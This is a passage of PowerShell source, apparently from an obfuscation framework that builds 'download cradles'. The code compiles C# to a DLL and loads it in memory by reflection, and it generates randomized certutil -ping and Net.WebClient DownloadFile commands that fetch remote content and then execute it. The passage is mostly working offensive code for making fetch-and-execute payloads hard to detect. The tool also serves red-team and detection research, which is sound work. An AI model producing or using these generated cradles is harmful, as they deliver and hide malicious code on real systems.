                            If(!$ClassAndMethodNeedUpdating -AND ($Script:LastInlineCSharp.Length -gt 0) -AND ($Script:LastInlineCSharp -eq $InlineCSharp.Replace('<<<0','').Replace('0>>>','')))
                            {
                                $BytesAsString = $Script:LastBytesAsString
                            }
                            Else
                            {
                                # Check if csc.exe is present. If not (like if running PowerShell on a non-Windows OS) then select from handful of pre-compiled versions and output warning to user.
                                $PathToCscArray = Get-ChildItem $env:windir\Microsoft.NET\Framework*\v*\csc.exe | ForEach-Object {$_.FullName}

                                Write-Host "`n"

                                If($PathToCscArray.Count -eq 0)
                                {
                                    Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
                                    Write-Host "Could not find " -NoNewLine
                                    Write-Host "csc.exe" -NoNewLine -ForegroundColor Yellow
                                    Write-Host " on this computer. Switching to small list of pre-compiled samples. (I.e. not very random)"

                                    # Use the input $ClassName to find pre-compiled CSharp sample with corresponding class name.
                                    If($ClassName -eq 'Class')
                                    {
                                        $PrecompiledCSharp = Get-Random -Input $LegitSoundingClassAndMethodCompiledDefault
                                    }
                                    ElseIf(($LegitSoundingClassAndMethodCompiledNormal | ForEach-Object {$_[0]}) -Contains $ClassName)
                                    {
                                        $PrecompiledCSharp = $LegitSoundingClassAndMethodCompiledNormal | Where-Object {$_[0] -eq $ClassName}
                                    }
                                    Else
                                    {
                                        $PrecompiledCSharp = Get-Random -Input $LegitSoundingClassAndMethodCompiledRandom
                                    }

                                    # Also update $SyntaxToInvoke and $InlineCSharp to reflect this updated ClassName and MethodName.
                                    $SyntaxToInvoke = $SyntaxToInvoke.Replace($ClassName,$PrecompiledCSharp[0]).Replace($MethodName,$PrecompiledCSharp[1])
                                    $InlineCSharp   = $InlineCSharp.Replace("public class $ClassName{","public class $($PrecompiledCSharp[0]){").Replace(" $MethodName(string "," $($PrecompiledCSharp[1])(string ")

                                    # Update current $ClassName, $MethodName, and $BytesAsString for remainder of this iteration.
                                    $ClassName  = $PrecompiledCSharp[0]
                                    $MethodName = $PrecompiledCSharp[1]

                                    # Handle extraction of correct pre-compiled CSharp (out of three possible options per each pre-compiled version).
                                    If($PostCradleCommandParam.Length -eq 0)
                                    {
                                        # Extract pre-compiled version that takes one argument as input and Invoke 11 is not selected.
                                        $BytesAsString = $PrecompiledCSharp[2][0]
                                    }
                                    ElseIf(!$SyntaxToInvoke.Contains(','))
                                    {
                                        # Extract pre-compiled version that takes two arguments as input and Invoke 11 was selected but no $PostCradleCommand.
                                        $BytesAsString = $PrecompiledCSharp[2][1]
                                    }
                                    Else
                                    {
                                        # Extract pre-compiled version that takes two arguments as input and Invoke 11 was selected and $PostCradleCommand is set.
                                        $BytesAsString = $PrecompiledCSharp[2][2]
                                    }

                                    # Extract ClassName, MethodName, and BytesAsString from above assigned pre-compiled CSharp and update 'WithTags' for next iteration.
                                    If($ClassAndMethodWithTags.GetType().Name -eq 'Object[]')
                                    {
                                        $ClassAndMethodWithTags = @($ClassName,$MethodName)
                                    }
                                    Else
                                    {
                                        $ClassAndMethodWithTags = '<<<0' + $ClassName + ' ' + $MethodName + '0>>>'
                                    }

                                    # Set updated $InlineCSharp and $BytesAsString into Script-level variables so we can just retrieve them next iteration if no re-compiling is necessary.
                                    $Script:LastInlineCSharp  = $InlineCSharp
                                    $Script:LastBytesAsString = $BytesAsString
                                }
                                Else
                                {
                                    # Temporary .cs and .dll files for CSharp compilation.
                                    $TempFileCs  = "$ScriptDir\cradle.cs"
                                    $TempFileDll = "$ScriptDir\cradle.dll"

                                    # Remove previous .cs and .dll CSharp artifacts if they exist from previous run.
                                    ForEach($TempFile in @($TempFileCs,$TempFileDll))
                                    {
                                        If(Test-Path $TempFile)
                                        {
                                            Remove-Item $TempFile
                                        }
                                    }

                                    # Write out $InlineCSharp to disk so we can compile to .dll with csc.exe and then read in the compiled bytes.
                                    Write-Output $InlineCSharp > $TempFileCs

                                    # Retrieve path to System.Management.Automation.dll for csc.exe command to be able to identify referenced assembly.
                                    $SystemManagementAutomationDllPath = [PsObject].Assembly.Location

                                    # Iterate through each csc.exe path until compilation is successful.
                                    ForEach($PathToCsc in $PathToCscArray)
                                    {
                                        If(!(Test-Path $TempFileDll))
                                        {
                                            Write-Host "[*] Re-compiling updated CSharp with " -NoNewLine
                                            Write-Host $PathToCsc -NoNewLine -ForegroundColor Yellow

                                            # Compile CSharp script in .cs to .dll.
                                            $NULL = . $PathToCsc /target:library /reference:$SystemManagementAutomationDllPath /out:$TempFileDll $TempFileCs
            
                                            If(Test-Path $TempFileDll)
                                            {
                                                Write-Host " - " -NoNewLine
                                                Write-Host "SUCCESS" -ForegroundColor Green

                                                Write-Host "[*] Successful Command: " -NoNewLine
                                                Write-Host ". $PathToCsc /target:library /reference:$SystemManagementAutomationDllPath /out:$TempFileDll $TempFileCs" -ForegroundColor Yellow
                                            }
                                            Else
                                            {
                                                Write-Host " - " -NoNewLine
                                                Write-Host "FAILED" -ForegroundColor Red
                                            }
                                        }
                                    }
        
                                    If(Test-Path $TempFileDll)
                                    {
                                        # Read in bytes from compiled CSharp.
                                        $Bytes = [System.IO.File]::ReadAllBytes($TempFileDll)
                                    }
                                    Else
                                    {
                                        Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
                                        Write-Host "CSharp code was not properly compiled and the resultant .dll file was not found at " -NoNewLine
                                        Write-Host $TempFileDll -NoNewLine -ForegroundColor Yellow
                                        Write-Host ")..."
            
                                        Write-Host "         Enter " -NoNewline
                                        Write-Host "RESET" -NoNewLine -ForegroundColor Yellow
                                        Write-Host " to start over and try again..."
                                    }

                                    # Remove .cs and .dll CSharp artifacts that were just created.
                                    ForEach($TempFile in @($TempFileCs,$TempFileDll))
                                    {
                                        If(Test-Path $TempFile)
                                        {
                                            Remove-Item $TempFile
                                        }
                                    }
        
                                    # Convert byte array to a byte array string format.
                                    $BytesAsString = "@(" + ($Bytes -Join ',') + ")"

                                    $OriginalLength = $BytesAsString.Length

                                    $Counter = 0
                                    For($NumberOfZeroes=600; $NumberOfZeroes -ge 6; $NumberOfZeroes = $NumberOfZeroes-2)
                                    {
	                                    # To significantly reduce space to fit on command line, we will "compress" adjacent 0's by converting it to an array multiplication syntax: @(0)*20, for example.
	                                    If($BytesAsString -Match "([(,]0){$NumberOfZeroes,}[^0]")
	                                    {
		                                    $Counter++

                                            # Get number of adjacent 0's in array.
                                            $ZeroCount = $Matches[0].Split(',').Count

                                            $Whitespace = ' '*(3-$ZeroCount.ToString().Length)
		                                    Write-Host "[*] Compressing $Whitespace" -NoNewLine
                                            Write-Host $ZeroCount -NoNewLine -ForegroundColor Yellow
                                            Write-Host " adjacent 0's in Byte Array..."

		                                    $RestOfArray = "+@(" + $Matches[0].Split(',')[-1]
		                                    If($Matches[0].EndsWith(')'))
		                                    {
			                                    $RestOfArray = ''
		                                    }

		                                    $BytesAsString = $BytesAsString.Replace($Matches[0],")+@(0)*$($Matches[0].Trim(',').Split(',').Count)" + $RestOfArray)
	                                    }
                                    }
                                    If($BytesAsString.StartsWith('@)+'))
                                    {
                                        $BytesAsString = $BytesAsString.SubString(3)
                                    }

                                    $UpdatedLength = $BytesAsString.Length

                                    If($OriginalLength -gt $UpdatedLength)
                                    {
                                        Write-Host "[*] Compressed Byte Array from " -NoNewLine
                                        Write-Host $OriginalLength -NoNewLine -ForegroundColor Yellow
                                        Write-Host " characters to " -NoNewLine
                                        Write-Host $UpdatedLength -NoNewLine -ForegroundColor Yellow
                                        Write-Host " characters..." -NoNewLine

                                        # Put a brief sleep so user can see the compilation and compression output more easily.
                                        Start-Sleep -Seconds 1
                                    }

                                    # Set updated $InlineCSharp and $BytesAsString into Script-level variables so we can just retrieve them next iteration if no re-compiling is necessary.
                                    $Script:LastInlineCSharp  = $InlineCSharp
                                    $Script:LastBytesAsString = $BytesAsString
                                }
    
                                Write-Host ""
                            }

                            # Add syntax to convert Byte Array string syntax to an actual byte array for Load method.
                            $BytesAsString = "[Byte[]]($BytesAsString)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        
                        $CommandArray += "$SetVar1($BytesAsString)"
                        $CommandArray += "$SetVar2'$Url'"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($CommandSetAsVariable)
                            {
                                $CommandArray += $CommandSetAsVariable
                            }
                            Else
                            {
                                $CommandArray += ''
                            }
                        }
                        Else
                        {
                            $CommandArray += ''
                        }

                        $CommandArray += ("$ReflectionAssembly::" + $Load.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "($GetVar1)")
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }
                        
                        # Set command ordering arrangement logic here.
                        $Syntax = (($CommandArray[$ArrayIndexOrder_012] + $CommandArray[3,4,5]) -Join ';').Trim(';').Replace(';;',';').Replace(';;',';').Replace(';0>>>;',';0>>>')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        17 {
            ###################################
            ## CERTUTIL - certutil.exe -ping ##
            ###################################

            # Variables required for Certutil syntax.
            $SkipTwo     = '-Skip 2'
            $SkipLastOne = (Get-Random -Input @('-SkipL','-SkipLa','-SkipLas','-SkipLast')) + ' 1'
            $Certutil    = Get-Random -Input @('certutil.exe','certutil','C:\Windows\System32\certutil.exe','C:\Windows\System32\certutil')
            $Ping        = Get-Random -Input @(' -ping ',' /ping ')

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $SelectObjectChainSyntax  = @()
                    $SelectObjectChainSyntax += '|' + $SelectObject.Replace($ModuleAutoLoadTag,'') + "$SkipTwo|" + $SelectObject.Replace($ModuleAutoLoadTag,'') + $SkipLastOne
                    $SelectObjectChainSyntax += '|' + $SelectObject.Replace($ModuleAutoLoadTag,'') + "$SkipLastOne|" + $SelectObject.Replace($ModuleAutoLoadTag,'') + $SkipTwo
                    $SelectObjectChainSyntax  = Get-Random -Input $SelectObjectChainSyntax
                    
                    $SelectObjectChainSyntaxWithTags  = @()
                    $SelectObjectChainSyntaxWithTags += '|' + $SelectObjectWithTags.Replace($ModuleAutoLoadTag,'') + "$SkipTwo|" + $SelectObjectWithTags.Replace($ModuleAutoLoadTag,'') + $SkipLastOne
                    $SelectObjectChainSyntaxWithTags += '|' + $SelectObjectWithTags.Replace($ModuleAutoLoadTag,'') + "$SkipLastOne|" + $SelectObjectWithTags.Replace($ModuleAutoLoadTag,'') + $SkipTwo
                    $SelectObjectChainSyntaxWithTags  = Get-Random -Input $SelectObjectChainSyntaxWithTags
  
                    $SyntaxToInvoke         = '((' + "$Certutil$Ping$Url$SelectObjectChainSyntax" + ")-Join`"``r``n`")"
                    $SyntaxToInvokeWithTags = '((' + "$Certutil$Ping$Url$SelectObjectChainSyntaxWithTags" + ")-Join`"``r``n`")"

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }
                      
                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {  
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url' # Url
                    $RandomVarName2 = 'pay' # Payload

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','SelectObject')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SelectObjectChainSyntax  = @()
                        $SelectObjectChainSyntax += '|' + $SelectObject.Replace($ModuleAutoLoadTag,'') + "$SkipTwo|" + $SelectObject.Replace($ModuleAutoLoadTag,'') + $SkipLastOne
                        $SelectObjectChainSyntax += '|' + $SelectObject.Replace($ModuleAutoLoadTag,'') + "$SkipLastOne|" + $SelectObject.Replace($ModuleAutoLoadTag,'') + $SkipTwo
                        $SelectObjectChainSyntax  = Get-Random -Input $SelectObjectChainSyntax
                        
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        
                        If($SelectObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SelectObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }

                        $SyntaxToInvoke = "(($Certutil$Ping$GetVar1$SelectObjectChainSyntax)-Join`"``r``n`")"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                        
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"
                        
                        If($SelectObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SelectObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + "$SetVar2$Certutil$Ping$GetVar1"
                        
                        $SyntaxToInvoke = "($GetVar2[2..($GetVar2.Length-2)]-Join`"``r``n`")"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray  -Join ';')}
                            2 {$Syntax = ($CommandArray2 -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','SelectObject')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SelectObjectChainSyntax  = @()
                        $SelectObjectChainSyntax += '|' + $SelectObject.Replace($ModuleAutoLoadTag,'') + "$SkipTwo|" + $SelectObject.Replace($ModuleAutoLoadTag,'') + $SkipLastOne
                        $SelectObjectChainSyntax += '|' + $SelectObject.Replace($ModuleAutoLoadTag,'') + "$SkipLastOne|" + $SelectObject.Replace($ModuleAutoLoadTag,'') + $SkipTwo
                        $SelectObjectChainSyntax  = Get-Random -Input $SelectObjectChainSyntax
                        
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        
                        If($SelectObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SelectObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }

                        $SyntaxToInvoke = "(($Certutil$Ping$GetVar1$SelectObjectChainSyntax)-Join`"``r``n`")"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                        
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"
                        
                        If($SelectObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SelectObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + "$SetVar2($Certutil$Ping$GetVar1)"
                        
                        $SyntaxToInvoke = "($GetVar2[2..(($GetVar2).Length-2)]-Join`"``r``n`")"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray  -Join ';')}
                            2 {$Syntax = ($CommandArray2 -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        20 {
            #############################################
            ## New-Object Net.WebClient - DownloadFile ##
            #############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")

                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectTag,$NewObject.Replace($ModuleAutoLoadTag,''))
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectTag,$NewObjectWithTags.Replace($ModuleAutoLoadTag,''))

                    # Add .Invoke to the end of $DownloadFile and $DownloadFileWithTags if $DownloadFile ends with ')'.
                    If($DownloadFile.EndsWith(')'))
                    {
                        $DownloadFile = $DownloadFile + '.Invoke'
      
                        If($DownloadFileWithTags.EndsWith('0>>>')) {$DownloadFileWithTags = $DownloadFileWithTags.SubString(0,$DownloadFileWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                       {$DownloadFileWithTags = $DownloadFileWithTags + '.Invoke'}
                    }

                    # Handle embedded tagging.
                    If($JoinWithTags.StartsWith('<<<0') -AND $JoinWithTags.EndsWith('0>>>'))
                    {
                        $JoinWithTags = $JoinWithTags.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                    }

                    # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                    If($Path -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                    {
                        $Path                = $Path
                        $PathWithTags        = $PathWithTags

                        $PathQuoted          = $Path
                        $PathQuotedWithTags  = $PathWithTags

                        $PathSourced         = $Path
                        $PathSourcedWithTags = $PathWithTags
                    }
                    Else
                    {
                        # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                        $PathWithTags = $PathWithTags.Replace($Path,$Path.Trim("'"))
                        $Path         = $Path.Trim("'")

                        # Create separate variables for DownloadFile method with quotes added to $Path.
                        $PathQuotedWithTags = "'$PathWithTags'"
                        $PathQuoted         = "'$Path'"

                        # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                        $PathSourcedWithTags = $PathWithTags
                        $PathSourced         = $Path
                        If($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                        {
                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            $PathSourcedWithTags = $PathWithTags.Replace($Path,"$SourceRandom$Path")
                            $PathSourced         = "$SourceRandom$Path"
                        }
                    }

                    $CradleSyntax         = '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadFile('$Url',$PathQuoted)"
                    $CradleSyntaxWithTags = '(' + $NewObjectWithTags.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadFileWithTags('$UrlWithTags',$PathQuotedWithTags)"

                    # Add extra semicolon check since disk-based cradles only include reading the downloaded file if Invoke is present.
                    # Otherwise $SyntaxToInvoke will be blank and no additional semicolon is needed.
                    $Semicolon = ';'
                    If($Invoke -eq $InvokeTag)
                    {
                        $SyntaxToInvoke         = ''
                        $SyntaxToInvokeWithTags = ''
                        $Semicolon              = ''
                    }
                    ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                    {
                        $SyntaxToInvoke         = $Invoke.Replace($PathTag,$PathSourced)
                        $SyntaxToInvokeWithTags = $InvokeWithTags.Replace($PathTag,$PathSourcedWithTags)
                        $Invoke                 = $InvokeTag
                        $InvokeWithTags         = $InvokeTag
                    }
                    Else
                    {
                        $SyntaxToInvoke         = $GetBytesRandom.Replace($PathTag,$Path)
                        $SyntaxToInvokeWithTags = $GetBytesRandom.Replace($PathTag,$PathWithTags)

                        # If $Path is a variable or PowerShell command then remove any quotes that may be encapsulating it (only for ::ReadAllBytes option).
                        If(($Path -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])') -AND !$Path.Contains(' '))
                        {
                            $SyntaxToInvoke         = $SyntaxToInvoke.Replace("'$Path'",$Path)
                            $SyntaxToInvokeWithTags = $SyntaxToInvokeWithTags.Replace("'$PathWithTags'",$PathWithTags)
                        }
                    }

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $CradleSyntax + $Semicolon + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $CradleSyntaxWithTags + $Semicolon + $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $CradleSyntax + $Semicolon + $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $CradleSyntaxWithTags + $Semicolon + $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }
                      
                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                    
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'    # WebClient
                    $RandomVarName2 = 'url'   # Url
                    $RandomVarName3 = 'wc2'   # WebClient (Argument)
                    $RandomVarName4 = 'df'    # DownloadFile (Method)
                    $RandomVarName5 = 'dpath' # Path

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 5

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','NewObject','DownloadFile')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadFile in single quotes if basic syntax is used.
                        If($DownloadFile.Contains('DownloadFile'))
                        {
